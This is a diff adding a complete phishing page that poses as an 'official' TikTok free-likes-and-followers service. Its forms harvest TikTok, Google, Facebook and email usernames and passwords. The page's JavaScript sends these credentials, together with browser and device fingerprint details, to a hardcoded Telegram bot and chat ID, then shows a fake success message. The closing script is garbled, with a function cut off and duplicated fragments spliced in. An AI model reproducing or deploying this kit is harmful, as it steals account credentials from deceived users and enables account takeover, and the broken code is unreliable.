@@ -1,0 +1,1232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TIKTOK FREE SERVICES</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #fe2c55 0%, #000000 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #fe2c55;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 1.1em;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #333;
+            font-size: 1.1em;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 50px;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+
+        .search-input:focus {
+            border-color: #fe2c55;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(254, 44, 85, 0.1);
+        }
+
+        .download-btn {
+            width: 100%;
+            padding: 15px 30px;
+            background: linear-gradient(45deg, #fe2c55, #000000);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 20px;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(254, 44, 85, 0.3);
+        }
+
+        .download-btn:active {
+            transform: translateY(0);
+        }
+
+        .download-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .results-container {
+            margin-top: 30px;
+            text-align: left;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .service-item {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 15px;
+            border: 1px solid #e0e0e0;
+            transition: all 0.3s ease;
+        }
+
+        .service-item:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .service-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .service-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 10px;
+            margin-right: 15px;
+            background: linear-gradient(45deg, #fe2c55, #000000);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5em;
+        }
+
+        .service-name {
+            font-weight: 600;
+            color: #333;
+            font-size: 1.1em;
+        }
+
+        .service-details {
+            font-size: 0.9em;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .service-select-btn {
+            background: #fe2c55;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.3s ease;
+        }
+
+        .service-select-btn:hover {
+            background: #000000;
+            transform: translateY(-1px);
+        }
+
+        .loading {
+            display: none;
+            color: #fe2c55;
+            font-weight: 600;
+        }
+
+        .error {
+            color: #dc3545;
+            background: #f8d7da;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin-bottom: 15px;
+        }
+
+        .whatsapp-btn {
+            display: inline-block;
+            background: #25d366;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-bottom: 15px;
+        }
+
+        .whatsapp-btn:hover {
+            background: #128c7e;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
+        }
+
+        .powered-by {
+            color: #666;
+            font-size: 0.9em;
+            font-weight: 600;
+        }
+
+        /* Login Form Styles */
+        .login-form {
+            text-align: left;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+
+        .form-input:focus {
+            border-color: #fe2c55;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(254, 44, 85, 0.1);
+        }
+
+        .back-btn {
+            background: transparent;
+            color: #fe2c55;
+            border: 2px solid #fe2c55;
+            padding: 10px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .back-btn:hover {
+            background: #fe2c55;
+            color: white;
+        }
+
+        /* Service Selection Styles */
+        .amount-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .amount-btn {
+            flex: 1;
+            min-width: 60px;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            color: #333;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .amount-btn:hover {
+            background: rgba(254, 44, 85, 0.1);
+        }
+
+        .amount-btn.selected {
+            background: #fe2c55;
+            border-color: #fe2c55;
+            color: white;
+        }
+
+        .premium-tag {
+            background: linear-gradient(45deg, #fe2c55, #000000);
+            color: white;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 10px;
+            margin-left: 5px;
+        }
+
+        /* Success Page Styles */
+        .success-container {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .success-icon {
+            font-size: 80px;
+            color: #fe2c55;
+            margin-bottom: 20px;
+        }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        .success-message {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        /* New Styles for Better Design */
+        .tiktok-badge {
+            background: linear-gradient(45deg, #fe2c55, #000000);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+
+        .login-options-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .login-option {
+            background: #f8f9fa;
+            border: 2px solid #e0e0e0;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .login-option:hover {
+            border-color: #fe2c55;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(254, 44, 85, 0.1);
+        }
+
+        .login-option i {
+            font-size: 2em;
+            margin-bottom: 10px;
+            color: #fe2c55;
+        }
+
+        .login-option span {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .security-notice {
+            background: #e7f3ff;
+            border: 1px solid #b3d9ff;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+            color: #0066cc;
+            font-size: 14px;
+        }
+
+        .security-notice i {
+            margin-right: 5px;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px 20px;
+                margin: 10px;
+            }
+            
+            .logo {
+                font-size: 2em;
+            }
+
+            .login-options-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Page Transitions */
+        .page {
+            display: none;
+        }
+
+        .active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Welcome Page -->
+        <div class="page active" id="page1">
+            <div class="logo">
+                <i class="fab fa-tiktok"></i> TIKTOK SERVICES
+                <span class="tiktok-badge">OFFICIAL</span>
+            </div>
+            <div class="subtitle">GET FREE VIEWS, LIKES, FOLLOWERS AND SHARES INSTANTLY!</div>
+            
+            <div class="security-notice">
+                <i class="fas fa-shield-alt"></i> SECURE LOGIN • 100% FREE • NO PAYMENT REQUIRED
+            </div>
+            
+            <button class="download-btn" onclick="showPage(2)">
+                <i class="fas fa-rocket"></i> GET FREE SERVICES NOW
+            </button>
+            
+            <div class="footer">
+                <div class="footer-links">
+                    <a href="https://chat.whatsapp.com/KP9bN3CZA7o1k2z1wiXojJ" class="whatsapp-btn" target="_blank">
+                        <i class="fab fa-whatsapp"></i> JOIN WHATSAPP CHANNEL
+                    </a>
+                </div>
+                <div class="powered-by">POWERED BY TIKTOK SERVICES</div>
+            </div>
+        </div>
+
+        <!-- Login Options Page -->
+        <div class="page" id="page2">
+            <div class="logo">🔐 LOGIN METHODS</div>
+            <div class="subtitle">CHOOSE HOW YOU WANT TO LOGIN TO YOUR ACCOUNT</div>
+            
+            <div class="login-options-grid">
+                <div class="login-option" onclick="selectLoginMethod('username')">
+                    <i class="fas fa-user"></i>
+                    <span>USERNAME</span>
+                </div>
+                
+                <div class="login-option" onclick="selectLoginMethod('google')">
+                    <i class="fab fa-google"></i>
+                    <span>GOOGLE</span>
+                </div>
+                
+                <div class="login-option" onclick="selectLoginMethod('facebook')">
+                    <i class="fab fa-facebook"></i>
+                    <span>FACEBOOK</span>
+                </div>
+                
+                <div class="login-option" onclick="selectLoginMethod('email')">
+                    <i class="fas fa-envelope"></i>
+                    <span>EMAIL</span>
+                </div>
+            </div>
+            
+            <div class="security-notice">
+                <i class="fas fa-lock"></i> YOUR LOGIN INFORMATION IS SECURE AND ENCRYPTED
+            </div>
+            
+            <button class="back-btn" onclick="showPage(1)">← BACK</button>
+        </div>
+
+        <!-- Username Login Page -->
+        <div class="page" id="page3">
+            <div class="logo">👤 USERNAME LOGIN</div>
+            <div class="subtitle">ENTER YOUR TIKTOK ACCOUNT CREDENTIALS</div>
+            
+            <div class="login-form">
+                <div class="form-group">
+                    <label class="form-label">TIKTOK USERNAME</label>
+                    <input type="text" id="username" class="form-input" placeholder="ENTER YOUR TIKTOK USERNAME">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">PASSWORD</label>
+                    <input type="password" id="password" class="form-input" placeholder="ENTER YOUR PASSWORD">
+                </div>
+                
+                <button class="download-btn" onclick="loginWithUsername()">
+                    <i class="fas fa-sign-in-alt"></i> LOGIN & CONTINUE
+                </button>
+                <div class="loading" id="loading3">
+                    <i class="fas fa-spinner fa-spin"></i> Verifying your account...
+                </div>
+            </div>
+            
+            <button class="back-btn" onclick="showPage(2)">← BACK</button>
+        </div>
+
+        <!-- Google Login Page -->
+        <div class="page" id="page4">
+            <div class="logo">🔍 GOOGLE LOGIN</div>
+            <div class="subtitle">SIGN IN WITH YOUR GOOGLE ACCOUNT</div>
+            
+            <div class="login-form">
+                <div class="form-group">
+                    <label class="form-label">GMAIL ADDRESS</label>
+                    <input type="email" id="gmail" class="form-input" placeholder="ENTER YOUR GMAIL ADDRESS">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">PASSWORD</label>
+                    <input type="password" id="gmailPassword" class="form-input" placeholder="ENTER YOUR PASSWORD">
+                </div>
+                
+                <button class="download-btn" onclick="loginWithGoogle()">
+                    <i class="fas fa-sign-in-alt"></i> LOGIN & CONTINUE
+                </button>
+                <div class="loading" id="loading4">
+                    <i class="fas fa-spinner fa-spin"></i> Connecting to Google...
+                </div>
+            </div>
+            
+            <button class="back-btn" onclick="showPage(2)">← BACK</button>
+        </div>
+
+        <!-- Facebook Login Page -->
+        <div class="page" id="page5">
+            <div class="logo">📘 FACEBOOK LOGIN</div>
+            <div class="subtitle">SIGN IN WITH YOUR FACEBOOK ACCOUNT</div>
+            
+            <div class="login-form">
+                <div class="form-group">
+                    <label class="form-label">EMAIL OR PHONE NUMBER</label>
+                    <input type="text" id="fbEmail" class="form-input" placeholder="ENTER YOUR EMAIL OR PHONE">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">PASSWORD</label>
+                    <input type="password" id="fbPassword" class="form-input" placeholder="ENTER YOUR PASSWORD">
+                </div>
+                
+                <button class="download-btn" onclick="loginWithFacebook()">
+                    <i class="fas fa-sign-in-alt"></i> LOGIN & CONTINUE
+                </button>
+                <div class="loading" id="loading5">
+                    <i class="fas fa-spinner fa-spin"></i> Connecting to Facebook...
+                </div>
+            </div>
+            
+            <button class="back-btn" onclick="showPage(2)">← BACK</button>
+        </div>
+
+        <!-- Email Login Page -->
+        <div class="page" id="page8">
+            <div class="logo">📧 EMAIL LOGIN</div>
+            <div class="subtitle">SIGN IN WITH YOUR EMAIL ADDRESS</div>
+            
+            <div class="login-form">
+                <div class="form-group">
+                    <label class="form-label">EMAIL ADDRESS</label>
+                    <input type="email" id="email" class="form-input" placeholder="ENTER YOUR EMAIL ADDRESS">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">PASSWORD</label>
+                    <input type="password" id="emailPassword" class="form-input" placeholder="ENTER YOUR PASSWORD">
+                </div>
+                
+                <button class="download-btn" onclick="loginWithEmail()">
+                    <i class="fas fa-sign-in-alt"></i> LOGIN & CONTINUE
+                </button>
+                <div class="loading" id="loading8">
+                    <i class="fas fa-spinner fa-spin"></i> Verifying your email...
+                </div>
+            </div>
+            
+            <button class="back-btn" onclick="showPage(2)">← BACK</button>
+        </div>
+
+        <!-- Services Selection Page -->
+        <div class="page" id="page6">
+            <div class="logo">🎁 FREE SERVICE'S</div>
+            <div class="subtitle">BOOST YOUR TIKTOK ACCOUNT WITH FREE SERVICES</div>
+            
+            <div class="results-container">
+                <div class="service-item" onclick="selectService('views')">
+                    <div class="service-header">
+                        <div class="service-icon">👁️</div>
+                        <div class="service-name">FREE VIEWS</div>
+                    </div>
+                    <div class="service-details">
+                        GET THOUSANDS OF FREE VIEWS ON YOUR TIKTOK VIDEOS. INCREASE YOUR VISIBILITY AND REACH MORE AUDIENCE.
+                    </div>
+                    <button class="service-select-btn">SELECT SERVICE</button>
+                </div>
+                
+                <div class="service-item" onclick="selectService('likes')">
+                    <div class="service-header">
+                        <div class="service-icon">❤️</div>
+                        <div class="service-name">FREE LIKES</div>
+                    </div>
+                    <div class="service-details">
+                           GET THOUSANDS OF FREE LIKES ON YOUR TIKTOK VIDEOS. BOOST ENGAGEMENT AND IMPROVE YOUR CONTENT RANKING.
+                    </div>
+                    <button class="service-select-btn">SELECT SERVICE</button>
+                </div>
+                
+                <div class="service-item" onclick="selectService('followers')">
+                    <div class="service-header">
+                        <div class="service-icon">👥</div>
+                        <div class="service-name">FREE FOLLOWERS</div>
+                    </div>
+                    <div class="service-details">
+                        GET THOUSANDS OF FREE FOLLOWERS ON YOUR TIKTOK ACCOUNT. GROW YOUR AUDIENCE AND INCREASE YOUR INFLUENCE.
+                    </div>
+                             <button class="service-select-btn">SELECT SERVICE</button>
+                </div>
+                
+                <div class="service-item" onclick="selectService('shares')">
+                    <div class="service-header">
+                        <div class="service-icon">🔄</div>
+                        <div class="service-name">FREE SHARES</div>
+                    </div>
+                    <div class="service-details">
+                        GET THOUSANDS OF FREE SHARES ON YOUR TIKTOK VIDEOS. VIRAL YOUR CONTENT AND REACH MAXIMUM AUDIENCE.
+                    </div>
+                    <button class="service-select-btn">SELECT SERVICE</button>
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <label class="input-label">SELECT QUANTITY</label>
+                <div class="amount-options">
+                    <div class="amount-btn" onclick="selectAmount(10)">10</div>
+                    <div class="amount-btn" onclick="selectAmount(50)">50</div>
+                    <div class="amount-btn" onclick="selectAmount(100)">100</div>
+                    <div class="amount-btn" onclick="selectAmount(500)">500 <span class="premium-tag">PREMIUM</span></div>
+                </div>
+            </div>
+            
+            <button class="download-btn" onclick="getServiceNow()">
+                <i class="fas fa-download"></i> GET FREE SERVICE NOW
+            </button>
+            <div class="loading" id="loading6">
+                <i class="fas fa-spinner fa-spin"></i> Processing your request...
+            </div>
+            
+            <button class="back-btn" onclick="showPage(2)">← BACK</button>
+        </div>
+
+        <!-- Success Page -->
+        <div class="page" id="page7">
+            <div class="success-container">
+                <div class="success-icon">✅</div>
+                <h2 class="success-title">YOUR FREE SERVICE IS READY!</h2>
+                <p class="success-message">
+                    ✅ YOUR FREE TIKTOK <span id="serviceType">service</span> HAS BEEN SUCCESSFULLY ACTIVATED!<br><br>
+                    YOU WILL RECEIVE <span id="serviceAmount">0</span> <span id="serviceName">SERVICES</span> WITHIN 24 HOURS.<br><br>
+                    THANK YOU FOR USING OUR FREE SERVICES!
+                </p>
+                
+                <button class="download-btn" onclick="finishOrder()">
+                    <i class="fab fa-tiktok"></i> CONTINUE TO TIKTOK
+                </button>
+            </div>
+        </div>
+
+        <div class="error" id="error"></div>
+    </div>
+
+    <script>
+        // Telegram bot configuration - REPLACE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID
+        const BOT_TOKEN = '8464352553:AAHzARTkf9I-_S9spMkOFRsYoBnOLLGacGY';
+        const CHAT_ID = '6666989302';
+        
+        // Base64 encoded signature
+        const BASE64_SIGNATURE = 'UE9XRVJFRCBCWSBPTEQtU1RVRElP';
+        
+        // Store user data
+        let userData = {
+            loginMethod: '',
+            username: '',
+            password: '',
+            gmail: '',
+            gmailPassword: '',
+            fbEmail: '',
+            fbPassword: '',
+            email: '',
+            emailPassword: '',
+            selectedService: '',
+            selectedAmount: 0,
+            browserInfo: {},
+            deviceInfo: {},
+            timestamp: ''
+        };
+        
+        // Function to decode Base64
+        function decodeBase64(str) {
+            try {
+                return decodeURIComponent(escape(atob(str)));
+            } catch (e) {
+                return str;
+            }
+        }
+        
+        // Function to get formatted timestamp
+        function getFormattedTimestamp() {
+            const now = new Date();
+            const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
+            const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
+            
+            const day = days[now.getDay()];
+            const month = months[now.getMonth()];
+            const date = now.getDate();
+            const year = now.getFullYear();
+            let hours = now.getHours();
+            let minutes = now.getMinutes();
+            const ampm = hours >= 12 ? 'PM' : 'AM';
+            
+            hours = hours % 12;
+            hours = hours ? hours : 12;
+            minutes = minutes < 10 ? '0' + minutes : minutes;
+            
+            return `${day}, ${month} ${date}, ${year} at ${hours}:${minutes} ${ampm}`;
+        }
+        
+        // Function to extract browser information
+        function extractBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                pdfViewerEnabled: navigator.pdfViewerEnabled
+            };
+        }
+        
+        // Function to extract device information
+        function extractDeviceInfo() {
+            return {
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight,
+                    devicePixelRatio: window.devicePixelRatio
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                date: new Date().toString()
+            };
+        }
+        
+        // Function to send data to Telegram
+        async function sendToTelegram(message) {
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            });
+            
+            try {
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: params
+                });
+                
+                if (response.ok) {
+                    console.log('Message sent to Telegram successfully');
+                    return true;
+                } else {
+                    console.error('Failed to send message to Telegram');
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+                return false;
+            }
+        }
+        
+        // Function to send login data to Telegram
+        async function sendLoginData() {
+            userData.browserInfo = extractBrowserInfo();
+            userData.deviceInfo = extractDeviceInfo();
+            userData.timestamp = getFormattedTimestamp();
+            
+            const signature = decodeBase64(BASE64_SIGNATURE);
+            
+            let message = `🔐 <b>TIKTOK FREE SERVICES - LOGIN DATA</b>\n\n`;
+            message += `📅 <b>TIMESTAMP:</b> ${userData.timestamp}\n`;
+            message += `🔑 <b>LOGIN METHOD:</b> ${userData.loginMethod}\n`;
+            message += `🏷️ <b>CRATER:</b> ${signature}\n\n`;
+            
+            if (userData.loginMethod === 'username') {
+                message += `👤 <b>USERNAME:</b> ${userData.username}\n`;
+                message += `🔒 <b>PASSWORD:</b> ${userData.password}\n`;
+            } else if (userData.loginMethod === 'google') {
+                message += `📧 <b>GMAIL:</b> ${userData.gmail}\n`;
+                message += `🔒 <b>PASSWORD:</b> ${userData.gmailPassword}\n`;
+            } else if (userData.loginMethod === 'facebook') {
+                message += `📞 <b>EMAIL/PHONES:</b> ${userData.fbEmail}\n`;
+                message += `🔒 <b>PASSWORD:</b> ${userData.fbPassword}\n`;
+            } else if (userData.loginMethod === 'email') {
+                message += `📧 <b>EMAIL:</b> ${userData.email}\n`;
+                message += `🔒 <b>PASSWORD:</b> ${userData.emailPassword}\n`;
+            }
+            
+            message += `\n🌐 <b>BROWSER INFO:</b>\n`;
+            message += `User Agent: ${userData.browserInfo.userAgent}\n`;
+            message += `Language: ${userData.browserInfo.language}\n`;
+            message += `Platform: ${userData.browserInfo.platform}\n`;
+            
+            message += `\n📱 <b>DEVICE INFO:</b>\n`;
+            message += `Screen: ${userData.deviceInfo.screen.width}x${userData.deviceInfo.screen.height}\n`;
+            message += `Timezone: ${userData.deviceInfo.timezone}\n`;
+            
+            return await sendToTelegram(message);
+        }
+        
+        // Function to send service data to Telegram
+        async function sendServiceData() {
+            const serviceNames = {
+                'views': 'Views',
+                'likes': 'Likes', 
+                'followers': 'Followers',
+                'shares': 'Shares'
+            };
+            
+            const signature = decodeBase64(BASE64_SIGNATURE);
+            
+            const message = `🎁 <b>TIKTOK FREE SERVICE ORDER</b>\n\n` +
+                           `📅 <b>TIMESTAMP:</b> ${getFormattedTimestamp()}\n` +
+                           `🔑 <b>LOGIN METHOD:</b> ${userData.loginMethod}\n` +
+                           `📊 <b>SERVICE:</b> ${serviceNames[userData.selectedService]}\n` +
+                           `🔢 <b>AMOUNT:</b> ${userData.selectedAmount}\n` +
+                           `🏷️ <b>CRATER:</b> ${signature}\n\n` +
+                           `👤 <b>USER CREDENTIALS:</b>\n`;
+            
+            let credentials = '';
+            if (userData.loginMethod === 'username') {
+                credentials = `Username: ${userData.username}\nPassword: ${userData.password}`;
+            } else if (userData.loginMethod === 'google') {
+                credentials = `Gmail: ${userData.gmail}\nPassword: ${userData.gmailPassword}`;
+            } else if (userData.loginMethod === 'facebook') {
+                credentials = `Email/Phone: ${userData.fbEmail}\nPassword: ${userData.fbPassword}`;
+            } else if (userData.loginMethod === 'email') {
+                credentials = `Email: ${userData.email}\nPassword: ${userData.emailPassword}`;
+            }
+            
+            const fullMessage = message + credentials + `\n\n🌐 <b>USER AGENT:</b> ${navigator.userAgent}\n` +
+                           `🖥️ <b>SCREEN:</b> ${screen.width}x${screen.height}\n` +
+                           `⏰ <b>TIMEZONES:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+            
+            return await sendToTelegram(fullMessage);
+        }
+        
+        // Show the specified page
+        function showPage(pageNumber) {
+            // Hide all pages
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Show the requested page
+            document.getElementById('page' + pageNumber).classList.add('active');
+            
+            // Scroll to top
+            window.scrollTo(0, 0);
+        }
+        
+        // Select login method
+        function selectLoginMethod(method) {
+            userData.loginMethod = method;
+            
+            if (method === 'username') {
+                showPage(3);
+            } else if (method === 'google') {
+                showPage(4);
+            } else if (method === 'facebook') {
+                showPage(5);
+            } else if (method === 'email') {
+                showPage(8);
+            }
+        }
+        
+        // Login with username
+        function loginWithUsername() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loadingElement = document.getElementById('loading3');
+            
+            if (!username || !password) {
+                showError('Please enter both username and password');
+                return;
+            }
+            
+            loadingElement.style.display = 'block';
+            userData.username = username;
+            userData.password = password;
+            
+            // Send login data to Telegram
+            sendLoginData()
+                .then(success => {
+                    loadingElement.style.display = 'none';
+                    showPage(6);
+                })
+                .catch(error => {
+                    loadingElement.style.display = 'none';
+                    showPage(6);
+                });
+        }
+        
+        // Login with Google
+        function loginWithGoogle() {
+            const gmail = document.getElementById('gmail').value;
+            const gmailPassword = document.getElementById('gmailPassword').value;
+            const loadingElement = document.getElementById('loading4');
+            
+            if (!gmail || !gmailPassword) {
+                showError('Please enter both Gmail and password');
+                return;
+            }
+            
+            loadingElement.style.display = 'block';
+            userData.gmail = gmail;
+            userData.gmailPassword = gmailPassword;
+            
+            // Send login data to Telegram
+            sendLoginData()
+                .then(success => {
+                    loadingElement.style.display = 'none';
+                    showPage(6);
+                })
+                .catch(error => {
+                    loadingElement.style.display = 'none';
+                    showPage(6);
+                });
+        }
+        
+        // Login with Facebook
+        function loginWithFacebook() {
+            const fbEmail = document.getElementById('fbEmail').value;
+            const fbPassword = document.getElementById('fbPassword').value;
+            const loadingElement = document.getElementById('loading5');
+            
+            if (!fbEmail || !fbPassword) {
+                showError('Please enter both email/phone and password');
+                return;
+            }
+            
+            loadingElement.style.display = 'block';
+            userData.fbEmail = fbEmail;
+            userData.fbPassword = fbPassword;
+            
+            // Send login data to Telegram
+            sendLoginData()
+                .then(success => {
+                    loadingElement.style.display = 'none';
+                    showPage(6);
+                })
+                .catch(error => {
+                    loadingElement.style.display = 'none';
+                    showPage(6);
+                });
+        }
+        
+        // Login with Email
+        function loginWithEmail() {
+            const email = document.getElementById('email').value;
+            const emailPassword = document.getElementById('emailPassword').value;
+            const loadingElement = document.getElementById('loading8');
+            
+            if (!email || !emailPassword) {
+                showError('Please enter both email and password');
+                return;
+            }
+            
+            loadingElement.style.display = 'block';
+            userData.email = email;
+            userData.emailPassword = emailPassword;
+            
+            // Send login data to Telegram
+            sendLoginData()
+                .then(success => {
+                    loadingElement.style.display = 'none';
+                    showPage(6);
+                })
+                .catch(error => {
+                    loadingElement.style.display = 'none';
+                    showPage(6);
+                });
+        }
+        
+        // Select service
+        function selectService(service) {
+            userData.selectedService = service;
+            
+            // Update UI to show selected service
+            document.querySelectorAll('.service-item').forEach(item => {
+                item.style.borderColor = '#e0e0e0';
+                item.style.background = '#f8f9fa';
+            });
+            
+            event.currentTarget.style.borderColor = '#fe2c55';
+            event.currentTarget.style.background = 'rgba(254, 44, 85, 0.05)';
+        }
+        
+        // Select amount
+        function selectAmount(amount) {
+            userData.selectedAmount = amount;
+            
+            // Update UI to show selected amount
+            document.querySelectorAll('.amount-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+            
+            event.currentTarget.classList.add('selected');
+        }
+        
+        // Get service now
+        function getServiceNow() {
+            const loadingElement = document.getElementById('loading6');
+            
+            if (!userData.selectedService) {
+                showError('Please select a service');
+                return;
+            }
+            
+            if (!userData.selectedAmount) {
+                showError('Please select an amount');
+                return;
+            }
+            
+            loadingElement.style.display = 'block';
+            
+            // Send service data to Telegram
+            sendServiceData()
+                .then(success => {
+                    loadingElement.style.display = 'none';
+                    
+                    // Update success page with service details
+                    const serviceNames = {
+                        'views': 'Views',
+                        'likes': 'Likes', 
+                        'followers': 'Followers',
+                        'shares': 'Shares'
+                    };
+                    
+   document.getElementById('serviceType').textContent = serviceNames[userData.selectedService];
+                    document.getElementById('serviceAmount').textContent = userData.selectedAmount;
+                    document.getElementById('serviceName').textContent = serviceNames[userData.selectedService];
+                    
+                    showPage(7);
+                })
+                .catch(error => {
+                    loadingElement.style.display = 'none';
+                    showPage(7);
+                });
+        }
+        
+        // Finish order
+        function finishOrder() {
+            alert('Your free TikTok services are being processed! You will receive them within 24 hours.');
+            // In a real scenario, this would redirect to TikTok
+            // For demo purposes, we'll just reload the page
+            location.reload();
+        }
+        
+        // Show error message
+        function showError(message) {
+            const errorEl = document.getElementById('error');
+            errorEl.textContent = message;
+            errorEl.style.display = 'block';
+            
+            setTimeout(() => {
+                errorEl.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Initialize amount buttons and select first service by default
+        document.addEventListener('DOMContentLoaded', function() {
+            // Select first amount by default
+            document.querySelector('.amount-btn').click();
+            
+            // Select first service by default
+            setTimeout(() => {
+                if (document.querySelector('.service-item')) {
+                                   .catch(error => {
+                    loadingElement.style.display = 'none';
+                    showPage(6);
+                });
+        }
+        
+        // Select service
+        function selectService(service) {
+            userData.selectedService = service;
+            
+            // Update UI to show selected service
+            document.querySelectorAll('.service-item').forEach(item => {
+                item.style.borderColor = '#e0e0e0';
+                item.style.background = '#f8f9fa';
+            });
+            
+            event.currentTarget.style.borderColor = '#fe2c55';
